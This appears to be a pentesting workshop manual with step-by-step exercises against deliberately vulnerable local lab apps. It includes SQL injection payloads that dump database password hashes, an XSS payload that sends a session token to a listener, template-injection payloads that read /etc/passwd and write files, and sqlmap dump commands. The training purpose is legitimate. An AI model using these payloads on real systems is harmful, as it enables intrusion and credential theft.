# Pentesting 101 - Workshop Exercise Instructions

## Understanding the Lab Environment 
### Basic Instructions
- You will need to use the root username and password whenever you need to authenticate to the computer. Username: **root**, Password: **we45**. There's another user in the VM, with Username: **we45** and password: **we45**
- All the examples and code from the lab are yours to keep. 
- We have used multiple tools for the lab. We have only used Open Source tools as we are only allowed to use open source tools, due to commercial licensing restrictions. 
- We also have a number of vulnerable machines running in Docker Containers on this Virtual Machine. Some of these are available open source and some of them have been developed by us at we45 for our training workshops
- You will need to use the Linux Command line to run all of the exercises today. However, please don’t fret if you are not familiar with Linux. The commands to run everything have been documented in the exercise manual.
- **IMPORTANT: The Machine you have been given is only 1024MB RAM, please increase it to 2048MB or 4096MB depending on your computer's capacity by right clicking on the imported Machine, going to `System` and increasing the RAM to 2048 MB**

### Simple Commands
* To open a new Terminal Tab -> `Ctrl + Shift + T` (not Command for Mac)
* To open a new Terminal Window -> `Ctrl + Shift + N` (not Command for Mac)
* To copy and paste in the terminal -> `Ctrl + Shift + C/V`
* Use the Browser from the Desktop and not from the Top Bar Menu


### Security Instructions
* You will need to use the root username and password whenever you need to authenticate to the computer. Username: root, Password: we45
* All the examples and code from the lab are yours to keep. 
* We have used multiple tools for the lab. We have only used Open Source tools as we are only allowed to use open source tools, due to commercial licensing restrictions. 
* We also have a number of vulnerable machines running in Docker Containers on this Virtual Machine. Some of these are available open source and some of them have been developed by us at we45 for our training workshops
* You will need to use the Linux Command line to run all of the exercises today. However, please don’t fret if you are not familiar with Linux. The commands to run everything have been documented in the exercise manual. 

## Application Credentials
#### wecare
* Username: betty.ross@we45.com, password: `secdevops`
* Username: bruce.banner@we45.com, password: `secdevops`
* Username: steve.jobs@we45.com, password: `secdevops`

#### Cut the Funds NodeJS App
* Email: maya.williams@widget.co, password: `superman123`
* Email: dave.matthews@widget.co, password: `superman123`
* Email: amy.cho@widget.co, password: `ironman456`
* (Manager) Email: andy.roberts@widget.co, password: `spiderman`

#### Vulnerable Flask App
* Username: admin, password: `admin123`


## Lynis - Audit System Security Settings
- Open the **Terminal** on your Desktop
- Run command `lynis audit system`
- Observe the results

## Docker Bench Security
- Open the **Terminal** on your Desktop
- Command: `/home/we45/Downloads/docker-bench-security`
- Command: `./docker-bench-security.sh`

## Scoping for a Pentest
Acme HCM is a leading SaaS application that delivers cutting-edge Human Capital Management Solutions to their customers. Over the years, Acme has grown as a product to provide plain-vanilla HCM solutions to highly customizable and platform-like abilities on their HCM system. They have embraced Agile Development Practices and Continuous Delivery principles to deliver applications to their customers at a rapid-pace. They have hosted their environment on AWS and have multiple regions to cater to their customers. 

They are planning to conduct a Penetration Test against their environment and application stack. 

This is their network diagram: 

![](Acme_Network_Diagram.png)

Based on this High-Level Network Diagram. Please identify the following: 

* What would be your ideal scoping for this pentest - Consider multiple conditions like Risk, Compliance, Apps, etc in your decision
* How would you prioritize the pentesting efforts? Is there something you can do other than a pentest for some aspects of security testing
* What are the different security considerations you would look at for different aspects of the proposed penetration test?

## Cracking MD5 Hashes
- Open the **Terminal** on your Desktop
- Please navigate to `Downloads` directory withn command `cd /home/we45/Downloads/`
- Type the command: `john-the-ripper --format=raw-md5 md5_hashes.txt`
- Type the command: `john-the-ripper --format=raw-md5 md5_hashes.txt --show`

## SQL Injection 
### Pre-Processing
* Start the NodeJS Stack by running the following commands: 
	* Open up the Terminal
	* Command: `start_node.sh`
	* It will run a full stack deployment of a Front-end service, a Web Service and a Datbase. The Front-end service runs on port 5000, the Backend Web Service runs on port 3000. We will be using the Web Service (3000) for this exercise
	* Open the application `Insomnia` on your Desktop. This allows you to interact with the Web Service. Its an HTTP Client

### Exercise Instruction
In Insomnia, you should automatically be on the Cut the Funds Workspace. This is the list of requests and responses for the webservice. You'll be using this tool to interact with the API. In the sidebar, click on the "Login Manager" request

![Login Manager](insomnia_login_manager.jpg)

Execute the Request, by clicking "Send" in the main window

![Send Request](send_insomnia.png)

If you are successfully logged in, you should get an 200 Response with an Authorization Token. Copy that token and paste it in Mousepad/etc

![Manager Token](token_200_manager.png)

Now in the sidebar, go to the SQLi Search Request. Ensure that you add the copied Authorization Token in Header Tab in the Request page

![Add Auth Token to Request](auth_token_header.png)

In the main page. you can change the search json attribute to any value you want. Search for something simple like a country for now. 

![Search Country](search_country.png)

Now try forcing an error, by injecting a single quote in the search param. It should throw an error. If it does, you can be sure that the app you are testing is vulnerable to SQL Injection

`Chile'`

![SQLi Search Error](sqli_search_error.png)

Now that we have established that SQL Injection is possible, let's start exploring SQL Injection Attacks against the application

	```
	India' UNION ALL SELECT null, (SELECT @@datadir)--  
	India' UNION ALL SELECT null, (SELECT @@version)-- 
	India' UNION ALL SELECT null, (SELECT user())-- 
	India' UNION ALL SELECT null, (SELECT database())--  
	India' UNION ALL SELECT null,(SELECT concat(user,':',authentication_string) from mysql.user LIMIT 1)-- 
	```
* Each of the above is an SQL Injection payload. Copy each payload and inject them in the search parameter by pasting the payload in the search field in the top right corner. Click the search button to execute the payload
* Observe the results

## Cross-Site Scripting - Persistent
## Pre-Processing
* Start the NodeJS Stack by running the following commands: 
	* Open up the Terminal
	* Command: `start_node.sh`
	* It will run a full stack deployment of a Front-end service, a Web Service and a Datbase. The Front-end service runs on port 5000, the Backend Web Service runs on port 3000. We will be using the Web Service (3000) for this exercise
	* Open the application `Insomnia` on your Desktop. This allows you to interact with the Web Service. Its an HTTP Client

### Exercise Instruction
First, we need to create an expense, and embed a cross site scripting payload in the one of the fields of the expense object.

1. For that, we need to login as user. In the sidebar you will find an option "Login User"

![Login User](login_user.png)

2. he request should already be filled out with user, Maya's email and password. You can just hit send on that requests

![Send Request](send_insomnia.png)

3. If you are successfully logged in, you should get an 200 Response with an Authorization Token. Copy that token and paste it in Mousepad/etc

![Manager Token](token_200_manager.png)

4. Now in the sidebar, go to the `Create Expense` Request. Ensure that you add the copied Authorization Token in Header Tab in the Request page

![Add Auth Token to Request](auth_token_header.png)

5. In the JSON Tab, you can start making some edits to the JSON Payload. In the reason field, add the following payload to test for Cross-Site Scripting

`<svg onload=alert(localStorage.getItem('token'))></svg>`

Now, click Send. If all goes well, the expense should have been created in Maya william's account. 

![XSS Request](xss_request.png)

Now open Firefox (Web Browser) from the Main Menu. Goto: `http://localhost:5000`

Login with Maya's email and password: `maya.williams@widget.co` and password: `superman123`

In the top bar, you should find "Manage Expenses". Click on that. Once you do, shortly, you should see that a JavaScript alert is fired at you with the Authorization Token of Maya's. This indicates that the attack has worked and the application is vulnerable to Cross Site Scripting

### Token Hijacking with Cross-Site Scripting
Let's repeat Steps 1 - 4 from the previous exercise. 

However, for Step 5 the XSS Payload will change to this: 

`<svg onload=\"var xhr = new XMLHttpRequest();xhr.open('GET', 'http://127.0.0.1:8000?token='+localStorage.getItem('token'), true);xhr.send();\"/>`

Before you open Firefox and repeat the steps from the previous exercise. Open up another terminal window and type the following command into it.

`python -m SimpleHTTPServer`

Leave this terminal open

Now repeat the steps from the Firefox Browser and observe the results. Once the page loads, go back to the terminal window to see if the token has been captured

## Nmap Basic Commands
- Open the **Terminal** on your Desktop
- Run the command `stop_all_containers.sh`
- Now run the command `start_nowasp.sh`, which will start a new container
- Type the following command in the terminal and press ENTER to perform a default TCP scan on the localhost with IP 127.0.0.1 `nmap -sT 127.0.0.1`
- Type the following command in the terminal and press ENTER to perform a default UDP scan on the localhost IP with 127.0.0.1 `nmap -sU 127.0.0.1`
- Type the following command in the terminal and press ENTER to perform a TCP scan on a specific set of TCP Ports (1 - 65535)  on the localhost with IP 127.0.0.1 `nmap -sT -p1-65535 127.0.0.1`
- Type the following command in the terminal and press ENTER to perform OS fingerprinting to identify the OS of the localhost with IP 127.0.0.1 `nmap -O 127.0.0.1`
- Type the following command in the terminal and press ENTER to perform a TCP SYN scan on the localhost with IP 127.0.0.1 `nmap -sS 127.0.0.1`
- Type the following command in the terminal and press ENTER to perform a default TCP scan with No Ping on the localhost with IP 127.0.0.1 `nmap -sT 127.0.0.1 -Pn`
- Type the following command in the terminal and press ENTER to perform a slow TCP scan, with traceroute on the localhost with IP 127.0.0.1 `nmap -sT 127.0.0.1 -Pn -T0 --traceroute`

## Nmap NSE Script - Scans
* Type the following command in the terminal and press ENTER to perform a discovery scan on the localhost with IP 127.0.0.1 `nmap --script discovery 127.0.0.1 -Pn`
* Type the following command in the terminal and press ENTER to perform a vulnerability scan on the localhost with IP 127.0.0.1 `nmap --script vuln 127.0.0.1 -Pn`

## Nikto - Web Application Scanning
- Open the **Terminal** on your Desktop
- Run the command `stop_all_containers.sh`
- Now run the command `start_nowasp.sh`, which will start a new container
- Launch a new Terminal window from your Desktop
- To run nikto on the web application running on TCP port 80 on localhost, type the following command in the terminal and hit Enter/return.
`nikto -h 127.0.0.1`
- Run Nikto and output HTML result: `nikto -h 127.0.0.1 -Format HTM -output nowasp.html`

## OWASP DirBuster - OWASP ZAP
- Open the **Terminal** on your Desktop
- Run the command `stop_all_containers.sh`
- Now run the command `start_nowasp.sh`, which will start a new container
- Open OWASP ZAP from your Desktop. Wait for it to load. When it loads, click on **Start**
- Open Chrome from your Desktop
- Go to the FoxyProxy icon as you can see from here

![FoxyProxy](foxyproxy.jpg)
- In **Select Mode**, choose OWASP ZAP and Close. This turns the icon Blue
- In the Chrome address bar, type "http://localhost"
- Now, if you go back to the OWASP ZAP Window, it would have started capturing requests and responses from Localhost. 
- Let's now perform a Directory Bruteforce 
- Click the **+** button in the lower panel in OWASP ZAP

![](zap_plus_button.jpg)
- Choose **Forced Browse** from the Drop-down. You are now in the forced browse panel.
- Select "Site" and choose any of the lists and click on the Play Button to start the Forced Browsing Enumeration. Observe the results. 

![](forced_browse_site.jpg)

## Passive Scan Plugins - OWASP ZAP
- Choose **Alerts** from the ZAP Lower Panel. You are now in the Alerts panel.

![](zap_passive.jpg)
- Observe the results and peruse the results.

## Server-Side Template Injection
* Open the **Terminal** on your Desktop
* Run the command `stop_all_containers.sh`
* Now run the command `start_flask.sh`, which will start a new container
* Open the Chrome Browser and navigate to a non-existent path: 
	* `http://localhost:5050/non_existent_path`
* Substitute the `non_existent_path` with one of the payloads below.
* Payloads: 
	* `{{ config.items() }}`
	* `{{''.__class__.mro()[1].__subclasses__()[40]('/etc/passwd').read()}}`

## XML External Entities
* Upload safe demo from `Samples` directory
* Upload unsafe demo `Pass.docx` from `Samples` Directory

## Automated Exploitation - SQL Injection with SQLMap
* Open Terminal, Command: `cd /home/we45/Downloads/sqlmap/`
* Examine the Vulnerable Request: Command: `cat /home/we45/Downloads/vul_request.txt`
* You might have to add the token with a new token, after logging in as Manager
* Run SQLMap with the following commands from below
	
	```
	python sqlmap/sqlmap.py -r /home/we45/Downloads/vul_request.txt --technique U
	python sqlmap/sqlmap.py -r /home/we45/Downloads/vul_request.txt --technique U --dbs
	python sqlmap/sqlmap.py -r /home/we45/Downloads/vul_request.txt --technique U -D expenses --tables
	python sqlmap/sqlmap.py /home/we45/Downloads/vul_request.txt --technique U --D expenses --dump

	```
	
## Insecure Direct Object Reference - Mass Assignment
## Pre-Processing
* Start the NodeJS Stack by running the following commands: 
	* Open up the Terminal
	* Command: `start_node.sh`
	* It will run a full stack deployment of a Front-end service, a Web Service and a Datbase. The Front-end service runs on port 5000, the Backend Web Service runs on port 3000. 
* Open the application `OWASP` on your Desktop.
* Open Chrome from your Desktop
* Go to the FoxyProxy icon as you can see from here

![FoxyProxy](foxyproxy.jpg)

* In **Select Mode**, choose OWASP ZAP and Close. This turns the icon Blue
* In the Chrome address bar, type "http://localhost:5000"
* Now, if you go back to the OWASP ZAP Window, it would have started capturing requests and responses from Localhost. 
 

### Exercise
* The objective of this attack is to get an expense approved, even without it being approved by a manager
* Let's Update an expense. 
* Login with Maya's email and password: `maya.williams@widget.co` and password: `superman123`. 
* In the top bar, you should find "Manage Expenses". Click on that. 
* You can add and update or only Update an existing expense, all the while the traffic is captured by OWASP ZAP
* Once this is done, go to OWASP ZAP and open up the following request from the side bar

![Update Expense](update_expense.png)

![Update Expense](update_expense_tab.png)

Right click anywhere on the request pane, and select the following option: 

![Update Expense](right_click_update.png)

Tamper with the request and add another field to this with `"isApproved": true` as shown below

![Tamper Expense](tamper_request.png)

And click "Send" in the request editor

If everything has gone well, you can refresh the expense page in Chrome and you should see that the expense that you tampered with, has been approved

![Approved Expense](expense_app.png)

## OWASP Dependency Check
* Open Terminal: Command: `cd /home/we45/Downloads/dependency-check/bin`
* Run Command: `./dependency-check.sh --project Hacmebooks --out . --scan /home/we45/Downloads/HacmeBooks/`
* Open the generated HTML report

## RetireJS
* Open Terminal: Command: `start_nowasp.sh`
* Open Chrome and goto `http://localhost`
* On the address bar, there's a RetireJS icon, next to FoxyProxy. Click on it to see vulnerabilities with JavaScript loaded in the DOM

## Calculate the DREAD Score

1. Security tester identified a SQL Injection flaw leading to compromise of the production DB, including customer passwords and card numbers. 
2. Attacker identifies an Authorization Flaw where an authenticated attacker can tamper with payloads of the Core API and gain access to other user accounts. 
1. Attacker is able to identify a CSRF flaw in the application, where the application administrator adds a user to the account without the admin’s knowledge. 
1. Attacker is able to identify a CSRF flaw in the application, where the application administrator is able to change the salary of a user in the system to a higher or lower salary
1. Tester identifies that one of the servers in the private network is vulnerable to Heartbleed
1. Unauthenticated attacker is able to identify a privilege escalation flaw using an AJAX request, which converts a trial HCM account to a paid HCM account with unlimited users. 
1. Tester finds that one of the Elasticsearch servers in the private network is vulnerable to CVE 2015-1427 which allows remote code execution to an unauthenticated user of Elasticsearch
1. Tester identifies that the network traffic between the Core API and the queuing System is not encrypted
1. Attacker identifies that the Email API Key and Secret is available in a public github repo
1. Authenticated Attacker is able to use payload in the application that redirects users to a third party site, without validation. 

## Create some parameters for a Penetration Testing "Rules of Engagement"

You are the Information Security Manager for a leading Fintech Product Company. You are engaging external penetration testers to perform a detailed assessment of your core customer facing application. 

This is not completely a black-box engagement. You have provided the testers with the following information: 

* Usernames and Passwords to multiple user roles and accounts
* A Detailed Walkthrough and Overview of the Applications and the Application Stack.
* High level understanding of risks and threat scenarios

Please keep the following in mind: 

* The app is already in production and is being used by customers across multiple geographies. 
* You have a single region of availability right now on your AWS cloud deployment

## Insecure Direct Object Reference - AJAX
* Start the WeCare Application by running the following commands: 
	* Open up the Terminal
	* Command: `stop_all_containers.sh`
	* Command: `start_wecare.sh`
* Navigate to the we care vulnerable web application by browsing the URL `http://localhost:9000` from a web browser. The web browser shortcut could be found on the desktop.
* Login to the application as Bruce Banner with the following credentials:
* Email: betty.ross@we45.com
* Password: secdevops
* Traverse to the following URL
* `http://localhost/record/add/`
* Open the Web Console by hitting Ctrl+Shift+K
* Firefox doesn't allow pasting to the console by default. So you need to type `allow pasting` without pressing a Return/Enter at the end
* Copy the following code and paste it in the web console

```
function update(jsn)
 {
    $.ajax({
      type: "POST",
      url: '/update/record/',
      data: {
       rid: jsn,
       remarks : 'Diabetes',
       csrfmiddlewaretoken: '',
           },
     success: function(data) {
           alert(data);
          },                
     error: function(xhr, textStatus, errorThrown) {
            alert("something went wrong");
            // alert(errorThrown)
          }
      });
 
 }

```
* Right click on the web browser and select View Page Source
* Copy the `csrfmiddlewaretoken` from the page source. (hit `ctrl+f` and enter `csrfmiddlewaretoken` as the search parameter. Copy the value)
* Paste the `csrfmiddlewaretoken` value within the single quotes in the 9th line of the payload given above
* Type `update(3);`
* Run the command by hitting Enter/return
* Upon running the payload web browser displays an alert Successfully updated test's Health Record
* Close the web console window
* Logout of the application
* Login to the application with the following credentials
* email: **steve.jobs@we45.com**
* password: **secdevops**
* Click on Health Record from the navigation panel on the left hand side
* Now click on Health Records from the drop down list and observe the remarks column. The remarks would be the string "injected by betty".

## Insecure Deserialization
* Open up a new terminal. Run the following commands: 
	* `stop_all_containers.sh`
	* `start_flask.sh`
* Now open up Chrome and goto: `http://localhost:5050/yaml`
* Here, upload a file from your `Downloads` directory called `test_expense.yml`
* Observe the results

## Detailed Exploit - Template Injection
* Open up a new terminal. Run the following commands: 
	* `stop_all_containers.sh`
	* `start_flask.sh`
* Open the Chrome Browser and navigate to a non-existent path: 
	* `http://localhost:5050/non_existent_path`
* Substitute the `non_existent_path` with one of the payloads below.
* Payloads: 
	* `{{ config.items() }}`

### Let's Exploit this further
* Repeat the steps from above
* Let's dump all the loaded python modules: 
	* `{{ ''.__class__.__mro__[2].__subclasses__() }}`
* Let's dump the /etc/passwd file: 
	* `{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}`
* Let's write a file to the Backend OS and continue to exploit it: 
	* `{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/owned.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}`
	* `{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/owned.cfg').read() }}`

	
## SQL Injection - Advanced Exploitation
* Start the WeCare Application by running the following commands: 
	* Open up the Terminal
	* Command: `stop_all_containers.sh`
	* Command: `start_wecare.sh`
* Navigate to the we care vulnerable web application by browsing the URL `http://localhost:9000` from a web browser. The web browser shortcut could be found on the desktop.
* Login to the application as Bruce Banner with the following credentials:
* Email: **bruce.banner@we45.com**
* Password: **secdevops**
* Browse to the tests page by clicking on Tests in the navigation panel towards the left hand side.
* Hover over the ‘I’ and ‘S’ buttons in the drop down list and click on them to toggle between Secure and Insecure tests page.
* Click on the button ‘I’ to view the insecure tests page or navigate to the URL `http://localhost/tests/`
* Use the following SQL injection payloads in this exercise

	```
	abcd' UNION ALL SELECT NULL,(SELECT version())-- 
	abcd' UNION ALL SELECT NULL,(SELECT user)-- 
	abcd' UNION ALL SELECT NULL,(SELECT current_user)-- 
	abcd' UNION ALL SELECT NULL,(SELECT getpgusername())-- 
	abcd' UNION ALL SELECT NULL,(SELECT current_database())-- 
	abcd' UNION ALL SELECT NULL,(SELECT current_setting('log_connections'))-- 
	abcd' UNION ALL SELECT NULL,(SELECT current_setting('port'))-- 
	abcd' UNION ALL SELECT NULL,(SELECT current_setting('password_encryption'))-- 
	abcd' UNION ALL SELECT NULL,(SELECT current_setting('config_file'))-- 
	abcd' UNION ALL SELECT NULL,(SELECT current_setting('hba_file'))-- 
	abcd' UNION ALL SELECT NULL,(SELECT current_setting('data_directory'))-- 
	abcd' UNION ALL SELECT NULL,(SELECT concat(usename,' : ',passwd) from pg_shadow)-- 
	abcd' UNION ALL SELECT NULL,(SELECT string_agg(table_name,', ') AS tables_list FROM information_schema.tables WHERE table_schema = 'public')-- 
	abcd' UNION ALL SELECT NULL,(SELECT string_agg(column_name,', ') AS columns_list FROM information_schema.columns WHERE table_schema = 'public' AND table_name = 'ctf_user')-- 
	abcd' UNION ALL SELECT NULL,(SELECT concat(email,' : ',password) FROM public.ctf_user where id=2)--
	```
* Each of the above is an SQL Injection payload. Copy each payload and inject them in the search parameter by pasting the payload in the search field in the top right corner. Click the search button to execute the payload
* Observe the results
